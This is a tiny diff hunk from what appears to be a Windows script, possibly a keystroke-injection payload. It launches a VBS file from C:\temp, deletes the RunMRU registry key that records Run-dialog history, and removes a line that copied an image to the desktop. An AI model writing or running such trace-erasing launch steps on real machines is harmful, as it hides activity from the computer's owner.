@@ -3,4 +3,4 @@
 Start-Process -FilePath C:\temp\kb.vbs
 
 cmd /c "reg delete HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU /va  /f"
-cmd /c move C:\temp\kb.jpg "%USERPROFILE%\Desktop\"
+
